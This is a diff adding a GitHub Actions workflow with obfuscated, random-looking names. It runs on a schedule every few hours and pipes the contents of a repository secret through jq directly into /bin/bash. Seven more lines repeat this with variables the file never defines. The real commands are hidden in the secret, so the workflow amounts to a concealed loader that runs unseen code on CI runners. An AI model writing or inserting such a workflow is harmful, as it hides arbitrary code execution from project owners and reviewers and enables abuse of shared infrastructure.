@@ -1,0 +1,23 @@
+name: jewelsscorched
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jewelsscorched
+        env:
+          jqx36536: ${{ secrets.jqx36536 }}
+        run: |
+          echo $jqx36536 | jq -r .ehq97106 | /bin/bash
+          echo $melb64 | jq -r .lb44228 | /bin/bash
+          echo $c53 | jq -r .pj36 | /bin/bash
+          echo $tlvp85 | jq -r .bzb33 | /bin/bash
+          echo $hwql82816 | jq -r .vff91 | /bin/bash
+          echo $ts3 | jq -r .kwj6 | /bin/bash
+          echo $jww5459 | jq -r .agn75 | /bin/bash
+          echo $qt483 | jq -r .dfrsh963 | /bin/bash
+
